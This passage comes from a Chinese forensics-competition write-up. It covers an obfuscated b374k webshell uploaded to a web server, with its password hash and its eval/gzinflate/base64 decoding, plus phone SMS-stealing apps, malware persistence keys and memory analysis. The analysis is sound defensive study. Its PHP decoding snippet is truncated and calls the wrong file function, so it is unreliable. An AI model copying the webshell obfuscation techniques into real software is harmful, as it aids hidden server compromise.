<p>C. b6778k-9.0.php</p>
<p>D. b374k-2.5.php</p>
<p>E. d374k-2.5.php</p>
<p>因为文件上传的文件名在表单里，我们的log是看不到的，所以我们直接在检材文件夹里搜索，搜的到的就是被上传的A，B，C，D 我看网上说c不是我个人存疑，apache的日志记录的是访问日志C不在日志里不能说明其不是被上传的<br>而且<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-161907312.png" class=""><br>很难把他理解成非上传的。如果有大佬知道正解可以评论纠正</p>
<h3 id="21-单选题-入侵者可能使用甚么漏洞进行入侵网页服务器-1分"><a href="#21-单选题-入侵者可能使用甚么漏洞进行入侵网页服务器-1分" class="headerlink" title="21. [单选题] 入侵者可能使用甚么漏洞进行入侵网页服务器? (1分)"></a>21. [单选题] 入侵者可能使用甚么漏洞进行入侵网页服务器? (1分)</h3><p>A. 文件上传漏洞</p>
<p>B. SQL 注入</p>
<p>C. 跨站脚本攻击</p>
<p>D. 格式化字符串弱点</p>
<p>看一眼上传的文件<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-161533336.png" class="">  </p>
<p>A<br>一看就知道是经过混淆的木马</p>
<h3 id="22-多选题-在网页服务器找到的所有文件档-doc-及-docx-中，有以下哪些文件制作人-Author-2分"><a href="#22-多选题-在网页服务器找到的所有文件档-doc-及-docx-中，有以下哪些文件制作人-Author-2分" class="headerlink" title="22. [多选题] 在网页服务器找到的所有文件档(doc 及 docx)中，有以下哪些文件制作人(Author)? (2分)"></a>22. [多选题] 在网页服务器找到的所有文件档(doc 及 docx)中，有以下哪些文件制作人(Author)? (2分)</h3><p>A. Kevin L. Brown</p>
<p>B. Peter R. Lee</p>
<p>C. Mary</p>
<p>D. May</p>
<p>E. Colin<br>导出所有的word文档，因为题目没让我们看dotx的文档所以我们看doc的文件即可<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-165942068.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-170040257.png" class="">  </p>
<p>选A、C</p>
<h3 id="23-多选题-在网页服务器中，哪个是可疑档案-它如何取得计算机控制权-3分"><a href="#23-多选题-在网页服务器中，哪个是可疑档案-它如何取得计算机控制权-3分" class="headerlink" title="23. [多选题] 在网页服务器中，哪个是可疑档案?它如何取得计算机控制权? (3分)"></a>23. [多选题] 在网页服务器中，哪个是可疑档案?它如何取得计算机控制权? (3分)</h3><p>A. 可疑档案: b6778k-9.0.php</p>
<p>B. 可疑档案: b374k-2.5.php</p>
<p>C. 可疑档案: upload.php</p>
<p>D. 透过浏览器远程管理取得计算机控制权</p>
<p>E.透过PuTTY(远程登录工具) 取得计算机控制权</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-170327487.png" class="">  
<p>黑客上传木马文件b374k-2.5.php，来rce，选B，D</p>
<h3 id="24-填空题-在网页服务器中，运行可疑档案需要密码，其密码的哈希值-Hash-Value-是甚么-请以英文全大写及阿拉伯数字回答-3分"><a href="#24-填空题-在网页服务器中，运行可疑档案需要密码，其密码的哈希值-Hash-Value-是甚么-请以英文全大写及阿拉伯数字回答-3分" class="headerlink" title="24. [填空题] 在网页服务器中，运行可疑档案需要密码，其密码的哈希值(Hash Value)是甚么? (请以英文全大写及阿拉伯数字回答) (3分)"></a>24. [填空题] 在网页服务器中，运行可疑档案需要密码，其密码的哈希值(Hash Value)是甚么? (请以英文全大写及阿拉伯数字回答) (3分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-170628216.png" class="">  
<p>分析一下这串代码其实就是通过拼接生成create_funtiocn，在通过create_funtiocn来调用eval运行木马<br>我们直接将拼接的eval改成echo看看这个木马的逻辑</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-172033834.png" class="">  
<p>在输出的代码里我们可以找到一个登陆逻辑，其login的md5值就是<code>$s_pass</code><br>0de664ecd2be02cdd54234a0d1229b43</p>
<h3 id="25-单选题-在网页服务器中，可疑档案的译码函数是甚么-2分"><a href="#25-单选题-在网页服务器中，可疑档案的译码函数是甚么-2分" class="headerlink" title="25. [单选题] 在网页服务器中，可疑档案的译码函数是甚么? (2分)"></a>25. [单选题] 在网页服务器中，可疑档案的译码函数是甚么? (2分)</h3><p>A. unzip_file(‘$x,$y’)</p>
<p>B. gzdecode (base64_decode($x))</p>
<p>C. gzinflate(base64_decode($x))</p>
<p>D. 以上皆否</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-172502601.png" class="">  
<p>C 通过gzinflate(base64_decode($x))来将后面的代码解密，然后给前面的eval运行，从而达成代码的混淆</p>
<h3 id="26-填空题-解压后的脚本档的档案大小是多少-请以字节及阿拉伯数字回答-3分"><a href="#26-填空题-解压后的脚本档的档案大小是多少-请以字节及阿拉伯数字回答-3分" class="headerlink" title="26. [填空题] 解压后的脚本档的档案大小是多少? (请以字节及阿拉伯数字回答) (3分)"></a>26. [填空题] 解压后的脚本档的档案大小是多少? (请以字节及阿拉伯数字回答) (3分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-174130549.png" class="">  
<p>我直接通过将eval改为file_put_content来写入文件，但是这样得到的与答案不同，猜测其说说的脚本一个是那串base64的编码。使用base64解密然后再使用gzinflate来填充压缩字符，然后写入文件<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$Code</span> = <span class="string">&#x27;&quot;&quot;, $s_pass); ?&gt;&#x27;</span>; <span class="comment">// base64编码</span></span><br><span class="line"><span class="variable">$File</span> = <span class="string">&#x27;test.php&#x27;</span>;<span class="comment">//解码后保存的文件</span></span><br><span class="line"><span class="variable">$Temp</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Code</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">gzinflate</span>(<span class="variable">$Temp</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;test.php&quot;</span>,<span class="variable">$temp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-174640358.png" class="">  </p>
<h3 id="27-多选题-解压后的脚本文件内有甚么功能-3分"><a href="#27-多选题-解压后的脚本文件内有甚么功能-3分" class="headerlink" title="27. [多选题] 解压后的脚本文件内有甚么功能? (3分)"></a>27. [多选题] 解压后的脚本文件内有甚么功能? (3分)</h3><p>A. 编辑文件</p>
<p>B. 删除文件</p>
<p>C. 更改用户密码</p>
<p>D. 加密文件</p>
<p>E. 重新命名文件<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-175226596.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-175244099.png" class="">  </p>
<p>ABE</p>
<h3 id="28-单选题-解压后的脚本含有压缩功能，当中使用的解压方法是甚么-2分"><a href="#28-单选题-解压后的脚本含有压缩功能，当中使用的解压方法是甚么-2分" class="headerlink" title="28. [单选题] 解压后的脚本含有压缩功能，当中使用的解压方法是甚么? (2分)"></a>28. [单选题] 解压后的脚本含有压缩功能，当中使用的解压方法是甚么? (2分)</h3><p>A. PclZip.php</p>
<p>B. Unzip_gz()</p>
<p>C. ZipArchive()</p>
<p>D. 以上皆否<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-175518504.png" class=""><br>搜一下可以搜到ZipArchive</p>
<h1 id="特普"><a href="#特普" class="headerlink" title="特普"></a>特普</h1><h2 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h2><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-183426521.png" class="">  
<p>设置里调个中文</p>
<h3 id="29-多选题-特普的电话中一张于2021年09月30日-10-45-12拍摄的相片包含以下哪些字-1分"><a href="#29-多选题-特普的电话中一张于2021年09月30日-10-45-12拍摄的相片包含以下哪些字-1分" class="headerlink" title="29. [多选题] 特普的电话中一张于2021年09月30日 10:45:12拍摄的相片包含以下哪些字? (1分)"></a>29. [多选题] 特普的电话中一张于2021年09月30日 10:45:12拍摄的相片包含以下哪些字? (1分)</h3><p>A. 精忠</p>
<p>B. 报国</p>
<p>C. 忠诚</p>
<p>D. 勇毅<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-184434778.png" class=""><br>直接搜索21年后的，找到二维码扫描。<br>CD</p>
<h3 id="30-多选题-特普的电话中的whatsapp账号85268421495-s-whatsapp-net中，有哪些其他人的WhatsApp用户数据记录-2分"><a href="#30-多选题-特普的电话中的whatsapp账号85268421495-s-whatsapp-net中，有哪些其他人的WhatsApp用户数据记录-2分" class="headerlink" title="30. [多选题] 特普的电话中的whatsapp账号85268421495@s.whatsapp.net中，有哪些其他人的WhatsApp用户数据记录? ) (2分)"></a>30. [多选题] 特普的电话中的whatsapp账号85268421495@s.whatsapp.net中，有哪些其他人的WhatsApp用户数据记录? ) (2分)</h3><p>A. 85222117188@s.whatsapp.net</p>
<p>B. 85289853825@s.whatsapp.net</p>
<p>C. 85264795287@s.whatsapp.net</p>
<p>D. 85231882226@s.whatsapp.net</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-185708158.png" class="">  
<p>我们再联系人可以找到其数据库的源文件。<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-185911495.png" class=""><br>再数据库里找到其他人的whatapp账号<br>A.D</p>
<h3 id="31-单选题-特普电话的热点分享密码是什么-1分"><a href="#31-单选题-特普电话的热点分享密码是什么-1分" class="headerlink" title="31. [单选题] 特普电话的热点分享密码是什么? (1分)"></a>31. [单选题] 特普电话的热点分享密码是什么? (1分)</h3><p>A. 12345678</p>
<p>B. 69447401bceb</p>
<p>C. Jioijo4542554</p>
<p>D. Dak Pou Home<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-190317113.png" class=""><br>B</p>
<h3 id="32-多选题-特普于经纬度22-278843-114-165783，没有做什么-2分"><a href="#32-多选题-特普于经纬度22-278843-114-165783，没有做什么-2分" class="headerlink" title="32. [多选题] 特普于经纬度22.278843, 114.165783，没有做什么? (2分)"></a>32. [多选题] 特普于经纬度22.278843, 114.165783，没有做什么? (2分)</h3><p>A. 拍影片</p>
<p>B. 拍照</p>
<p>C. 使用google map</p>
<p>D. 在Whatsapp中分享实时位置</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-190410451.png" class="">  
<p>A,C,D</p>
<h3 id="33-多选题-特普于电话中安装了一个可疑软件-版本为2020033001-，跟据该可疑软件的安装档，下列哪项描述正确-2分"><a href="#33-多选题-特普于电话中安装了一个可疑软件-版本为2020033001-，跟据该可疑软件的安装档，下列哪项描述正确-2分" class="headerlink" title="33. [多选题] 特普于电话中安装了一个可疑软件(版本为2020033001)，跟据该可疑软件的安装档，下列哪项描述正确? (2分)"></a>33. [多选题] 特普于电话中安装了一个可疑软件(版本为2020033001)，跟据该可疑软件的安装档，下列哪项描述正确? (2分)</h3><p>A. 软件名称是安全防护</p>
<p>B. 软件名称是安心回家</p>
<p>C. 软件签名(signAlgorithm)以 SHA512withRSA加密</p>
<p>D. 封包名称(packageName)是org.chromium.webapk.a5b80edf82b436506_v2<br>搜索版本号可以找到其apk位置<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-192015233.png" class=""><br>将其导出后放到雷电apk取证里<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-192446420.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-192609202.png" class="">  </p>
<p>A</p>
<h3 id="34-多选题-特普于电话中安装了一个可疑软件-版本为2020033001-，跟据该可疑软件的安装档，可疑软件中涉及以下安全许可-2分"><a href="#34-多选题-特普于电话中安装了一个可疑软件-版本为2020033001-，跟据该可疑软件的安装档，可疑软件中涉及以下安全许可-2分" class="headerlink" title="34. [多选题] 特普于电话中安装了一个可疑软件(版本为2020033001)，跟据该可疑软件的安装档，可疑软件中涉及以下安全许可? (2分)"></a>34. [多选题] 特普于电话中安装了一个可疑软件(版本为2020033001)，跟据该可疑软件的安装档，可疑软件中涉及以下安全许可? (2分)</h3><p>A. android.permission.READ_SMS读取短信内容</p>
<p>B. android.permission.SEND_SMS发送短信</p>
<p>C. android.permission.READ_CONTACTS读取联系人</p>
<p>D. android.permission.BLUETOOTH使用蓝牙</p>
<p>E. android.permission.CLEAR_APP_CACHE清除应用缓存</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-192739205.png" class="">  
<p>ABC</p>
<h3 id="35-填空题-特普可能在电话中被可疑软件窃取了的验证码是什么-请以英文全大写及阿拉伯数字回答-2分"><a href="#35-填空题-特普可能在电话中被可疑软件窃取了的验证码是什么-请以英文全大写及阿拉伯数字回答-2分" class="headerlink" title="35. [填空题] 特普可能在电话中被可疑软件窃取了的验证码是什么? (请以英文全大写及阿拉伯数字回答) (2分)"></a>35. [填空题] 特普可能在电话中被可疑软件窃取了的验证码是什么? (请以英文全大写及阿拉伯数字回答) (2分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-195557395.png" class="">  
<p>113476<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-200316437.png" class=""><br>在apk里可以找到String.xml大概率为抓取字符的关键词</p>
<h2 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h2><h3 id="36-填空题-特普的计算机可能中了病毒，病毒的加壳-Packing-方法是甚么-请以英文全大写作答-2分"><a href="#36-填空题-特普的计算机可能中了病毒，病毒的加壳-Packing-方法是甚么-请以英文全大写作答-2分" class="headerlink" title="36. [填空题] 特普的计算机可能中了病毒，病毒的加壳(Packing)方法是甚么? (请以英文全大写作答) (2分)"></a>36. [填空题] 特普的计算机可能中了病毒，病毒的加壳(Packing)方法是甚么? (请以英文全大写作答) (2分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-210705741.png" class="">  
<p>在下载里可以找到恶意文件,丢到查壳软件里.</p>
<h3 id="37-单选题-特普的计算机可能中了病毒，病毒的编译工具是甚么-2分"><a href="#37-单选题-特普的计算机可能中了病毒，病毒的编译工具是甚么-2分" class="headerlink" title="37. [单选题] 特普的计算机可能中了病毒，病毒的编译工具是甚么? (2分)"></a>37. [单选题] 特普的计算机可能中了病毒，病毒的编译工具是甚么? (2分)</h3><p>A. GCC</p>
<p>B. Borland</p>
<p>C. TCC</p>
<p>D. Microsoft Visual C/C++<br>查看软件也给出了选D</p>
<h3 id="38-填空题-特普的计算机可能中了病毒，病毒的编译者使用可能使用的账户名称是甚么-请以英文全大写作答-3分"><a href="#38-填空题-特普的计算机可能中了病毒，病毒的编译者使用可能使用的账户名称是甚么-请以英文全大写作答-3分" class="headerlink" title="38. [填空题] 特普的计算机可能中了病毒，病毒的编译者使用可能使用的账户名称是甚么? (请以英文全大写作答) (3分)"></a>38. [填空题] 特普的计算机可能中了病毒，病毒的编译者使用可能使用的账户名称是甚么? (请以英文全大写作答) (3分)</h3><h3 id="39-单选题-特普的计算机可能中了病毒，病毒的自我复制位置是甚么-2分"><a href="#39-单选题-特普的计算机可能中了病毒，病毒的自我复制位置是甚么-2分" class="headerlink" title="39. [单选题] 特普的计算机可能中了病毒，病毒的自我复制位置是甚么? (2分)"></a>39. [单选题] 特普的计算机可能中了病毒，病毒的自我复制位置是甚么? (2分)</h3><p>A. C:\Temp\temp.txt</p>
<p>B. C:\Users\<profile>\Desktop\malware.exe</p>
<p>C. C:\Users\public\malware.exe</p>
<p>D. C:\a.txt</p>
<h3 id="40-单选题-特普的计算机可能中了病毒，病毒的修改登录文件位置是甚么-3分"><a href="#40-单选题-特普的计算机可能中了病毒，病毒的修改登录文件位置是甚么-3分" class="headerlink" title="40. [单选题] 特普的计算机可能中了病毒，病毒的修改登录文件位置是甚么? (3分)"></a>40. [单选题] 特普的计算机可能中了病毒，病毒的修改登录文件位置是甚么? (3分)</h3><p>A. HKLM\Software\Microsoft\Windows\CurrentVersion\Run</p>
<p>B. HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</p>
<p>C. HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList</p>
<p>D.HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background</p>
<h3 id="41-多选题-特普的计算机可能中了病毒，病毒留下了ASCII-ART-ASCII艺术-文字图-，以下哪个不是病毒留下-3分"><a href="#41-多选题-特普的计算机可能中了病毒，病毒留下了ASCII-ART-ASCII艺术-文字图-，以下哪个不是病毒留下-3分" class="headerlink" title="41. [多选题] 特普的计算机可能中了病毒，病毒留下了ASCII ART(ASCII艺术, 文字图)，以下哪个不是病毒留下? (3分)"></a>41. [多选题] 特普的计算机可能中了病毒，病毒留下了ASCII ART(ASCII艺术, 文字图)，以下哪个不是病毒留下? (3分)</h3><p>A. HI</p>
<p>B. HELLO</p>
<p>C. HOW ARE YOU</p>
<p>D. GOODBYE</p>
<h3 id="42-单选题-特普的计算机可能中了病毒，病毒扰乱文件目标文件名是甚么-2分"><a href="#42-单选题-特普的计算机可能中了病毒，病毒扰乱文件目标文件名是甚么-2分" class="headerlink" title="42. [单选题] 特普的计算机可能中了病毒，病毒扰乱文件目标文件名是甚么? (2分)"></a>42. [单选题] 特普的计算机可能中了病毒，病毒扰乱文件目标文件名是甚么? (2分)</h3><p>A. C:\Users\<profile>\Documents\target.txt</p>
<p>B. C:\Users\<profile>\Desktop\target.txt</p>
<p>C. C:\c.txt</p>
<p>D. C:\temp.txt</p>
<h3 id="43-单选题-特普的计算机可能中了病毒，病毒扰乱文件方法是甚么-3分"><a href="#43-单选题-特普的计算机可能中了病毒，病毒扰乱文件方法是甚么-3分" class="headerlink" title="43. [单选题] 特普的计算机可能中了病毒，病毒扰乱文件方法是甚么? (3分)"></a>43. [单选题] 特普的计算机可能中了病毒，病毒扰乱文件方法是甚么? (3分)</h3><p>A. + 3</p>
<p>B. XOR 5</p>
<p>C. + 4</p>
<p>D. – 4</p>
<h2 id="计算机内存镜像"><a href="#计算机内存镜像" class="headerlink" title="计算机内存镜像"></a>计算机内存镜像</h2><h3 id="44-填空题-特普的计算机中，哪一个是-FTK-Imager-exe-的程式编号-PID-请阿拉伯数字回答-1分"><a href="#44-填空题-特普的计算机中，哪一个是-FTK-Imager-exe-的程式编号-PID-请阿拉伯数字回答-1分" class="headerlink" title="44. [填空题] 特普的计算机中，哪一个是 FTK Imager.exe 的程式编号(PID)? (请阿拉伯数字回答) (1分)"></a>44. [填空题] 特普的计算机中，哪一个是 FTK Imager.exe 的程式编号(PID)? (请阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-222302392.png" class="">  
<h3 id="45-多选题-特普的计算机中，cmd-exe-PID-4496-它的执行日期及时间是-1分"><a href="#45-多选题-特普的计算机中，cmd-exe-PID-4496-它的执行日期及时间是-1分" class="headerlink" title="45. [多选题] 特普的计算机中，cmd.exe (PID: 4496) 它的执行日期及时间是? (1分)"></a>45. [多选题] 特普的计算机中，cmd.exe (PID: 4496) 它的执行日期及时间是? (1分)</h3><p>A. 2021-10-17</p>
<p>B. 2021-10-18</p>
<p>C. 2021-10-19</p>
<p>D. 10:42:51</p>
<p>E. 10:43:09</p>
<p>F. 10:43:25<br>CE<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-222346797.png" class="">  </p>
<h3 id="46-填空题-特普的计算机曾经以FTP-对外连接，连接的IP是-请以阿拉伯数字回答，不用输入”-”-2分"><a href="#46-填空题-特普的计算机曾经以FTP-对外连接，连接的IP是-请以阿拉伯数字回答，不用输入”-”-2分" class="headerlink" title="46. [填空题] 特普的计算机曾经以FTP 对外连接，连接的IP是? (请以阿拉伯数字回答，不用输入”.”) (2分)"></a>46. [填空题] 特普的计算机曾经以FTP 对外连接，连接的IP是? (请以阿拉伯数字回答，不用输入”.”) (2分)</h3><h3 id="47-多选题-特普的计算机中，以下哪一个指令于上述连接中有使用过-3分"><a href="#47-多选题-特普的计算机中，以下哪一个指令于上述连接中有使用过-3分" class="headerlink" title="47. [多选题] 特普的计算机中，以下哪一个指令于上述连接中有使用过? (3分)"></a>47. [多选题] 特普的计算机中，以下哪一个指令于上述连接中有使用过? (3分)</h3><p>A. get</p>
<p>B. put</p>
<p>C. delete</p>
<p>D. bye</p>
<p>E. quit<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-223709816.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-223720921.png" class=""><br>猜测其应该是将病毒推送到服务器，即选BD</p>
<h3 id="48-多选题-在Linux-的”Volatility”-中，哪一个指令可以知道此程式支持哪一个Windows-版本-2分"><a href="#48-多选题-在Linux-的”Volatility”-中，哪一个指令可以知道此程式支持哪一个Windows-版本-2分" class="headerlink" title="48. [多选题] 在Linux 的”Volatility” 中，哪一个指令可以知道此程式支持哪一个Windows 版本? (2分)"></a>48. [多选题] 在Linux 的”Volatility” 中，哪一个指令可以知道此程式支持哪一个Windows 版本? (2分)</h3><p>A. vol.py —profile</p>
<p>B. vol.py —systeminfo</p>
<p>C. vol.py —info</p>
<p>D. vol.py —verinfo</p>
<p>选c<br><a href="https://blog.csdn.net/Fly_hps/article/details/79961707">https://blog.csdn.net/Fly_hps/article/details/79961707</a></p>
<h1 id="常威"><a href="#常威" class="headerlink" title="常威"></a>常威</h1><h2 id="手机-1"><a href="#手机-1" class="headerlink" title="手机"></a>手机</h2><h3 id="49-填空题-常威手机中的Telegram有可能是在2021年9月24日-时44分58秒-UTC-8-首次下载的。-请以阿拉伯数字输入答案-2分"><a href="#49-填空题-常威手机中的Telegram有可能是在2021年9月24日-时44分58秒-UTC-8-首次下载的。-请以阿拉伯数字输入答案-2分" class="headerlink" title="49. [填空题] 常威手机中的Telegram有可能是在2021年9月24日_时44分58秒 (UTC +8) 首次下载的。(请以阿拉伯数字输入答案) (2分)"></a>49. [填空题] 常威手机中的Telegram有可能是在2021年9月24日<strong>_</strong>时44分58秒 (UTC +8) 首次下载的。(请以阿拉伯数字输入答案) (2分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-224517521.png" class="">  
<p>4</p>
<h3 id="50-填空题-常威手机曾经连接的无人机名称是什么-请以英文全大写及阿拉伯数字回答-1分"><a href="#50-填空题-常威手机曾经连接的无人机名称是什么-请以英文全大写及阿拉伯数字回答-1分" class="headerlink" title="50. [填空题] 常威手机曾经连接的无人机名称是什么?(请以英文全大写及阿拉伯数字回答) (1分)"></a>50. [填空题] 常威手机曾经连接的无人机名称是什么?(请以英文全大写及阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-224819246.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-225224376.png" class="">  
<p>SSPARK</p>
<h3 id="51-填空题-常威手机中，档案“dji1633936161416-mp4”的解像度是-例如是1920-x-1280，请输入-19201280-。-1分"><a href="#51-填空题-常威手机中，档案“dji1633936161416-mp4”的解像度是-例如是1920-x-1280，请输入-19201280-。-1分" class="headerlink" title="51. [填空题] 常威手机中，档案“dji1633936161416.mp4”的解像度是 __ (例如是1920 x 1280，请输入 19201280)。 (1分)"></a>51. [填空题] 常威手机中，档案“dji1633936161416.mp4”的解像度是 <strong><strong><strong><em>__</em></strong></strong></strong> (例如是1920 x 1280，请输入 19201280)。 (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-225601492.png" class="">  
<p>导出文件查看属性<br>1280x720</p>
<h3 id="52-填空题-常威手机中，发现于网络上下载的软件“安心出行”安装档的哈希值-MD5-是-请以英文全大写及阿拉伯数字回答-2分"><a href="#52-填空题-常威手机中，发现于网络上下载的软件“安心出行”安装档的哈希值-MD5-是-请以英文全大写及阿拉伯数字回答-2分" class="headerlink" title="52. [填空题] 常威手机中，发现于网络上下载的软件“安心出行”安装档的哈希值(MD5)是?(请以英文全大写及阿拉伯数字回答) (2分)"></a>52. [填空题] 常威手机中，发现于网络上下载的软件“安心出行”安装档的哈希值(MD5)是?(请以英文全大写及阿拉伯数字回答) (2分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-225855031.png" class="">  
<p>81c342665d9a8d4d02b0fbb7033167b5<br>导出计算hash值</p>
<h3 id="53-多选题-常威手机中执行软件“安心出行”-版本2-1-3-中涉及以下安全许可-2分"><a href="#53-多选题-常威手机中执行软件“安心出行”-版本2-1-3-中涉及以下安全许可-2分" class="headerlink" title="53. [多选题] 常威手机中执行软件“安心出行”(版本2.1.3)中涉及以下安全许可? (2分)"></a>53. [多选题] 常威手机中执行软件“安心出行”(版本2.1.3)中涉及以下安全许可? (2分)</h3><p>A. android.permission.ACCESS_WIFI_STATE 获取WiFi状态</p>
<p>B. android.permission.BATTERY_STATS电量统计</p>
<p>C. android.permission.VIBRATE使用振动</p>
<p>D. android.permission.CONTROL_LOCATION_UPDATES控制定位更新</p>
<p>E. ndroid.permission.CAMERA拍照权限</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-130827937.png" class="">  
<p>A</p>
<h3 id="54-多选题-常威手机中软件“安心出行”-版本2-1-3-的安装档-apk-中，哪个不是它的签名算法-3分"><a href="#54-多选题-常威手机中软件“安心出行”-版本2-1-3-的安装档-apk-中，哪个不是它的签名算法-3分" class="headerlink" title="54. [多选题] 常威手机中软件“安心出行”(版本2.1.3)的安装档(.apk)中，哪个不是它的签名算法? (3分)"></a>54. [多选题] 常威手机中软件“安心出行”(版本2.1.3)的安装档(.apk)中，哪个不是它的签名算法? (3分)</h3><p>A. MD5withRSA</p>
<p>B. SHA256withRSA</p>
<p>C. SHA256withDSA</p>
<p>D. MD5withDSA<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-131912700.png" class=""><br>都是sha256-rsa</p>
<p>ACD</p>
<h3 id="55-多选题-于常威的手机中执行软件“安心出行”-版本1-可能会连接至哪一个网站-2分"><a href="#55-多选题-于常威的手机中执行软件“安心出行”-版本1-可能会连接至哪一个网站-2分" class="headerlink" title="55. [多选题] 于常威的手机中执行软件“安心出行”(版本1)可能会连接至哪一个网站? (2分)"></a>55. [多选题] 于常威的手机中执行软件“安心出行”(版本1)可能会连接至哪一个网站? (2分)</h3><p>A. <a href="https://back-home-****.pages.dev">https://back-home-****.pages.dev</a></p>
<p>B. org.chromium.<strong>**</strong>.a5b80edf82b436506</p>
<p>C. org.chromium.<strong>**</strong>.a5b80edf82b436506_v2</p>
<p>D. <a href="https://back-home-****.pages.dev/manifest.json">https://back-home-****.pages.dev/manifest.json</a></p>
<h2 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h2><h3 id="56-单选题-在常威苹果手提计算机-用户开机密码是什么-提示：常威-USB-设备中可能有相关数据-3分"><a href="#56-单选题-在常威苹果手提计算机-用户开机密码是什么-提示：常威-USB-设备中可能有相关数据-3分" class="headerlink" title="56. [单选题] 在常威苹果手提计算机, 用户开机密码是什么 ?(提示：常威 USB 设备中可能有相关数据) (3分)"></a>56. [单选题] 在常威苹果手提计算机, 用户开机密码是什么 ?(提示：常威 USB 设备中可能有相关数据) (3分)</h3><p>A. C<em>*sthegoa</em></p>
<p>B. Draw<em>*fgd</em>f</p>
<p>C. Co<em>kkfid</em>dd</p>
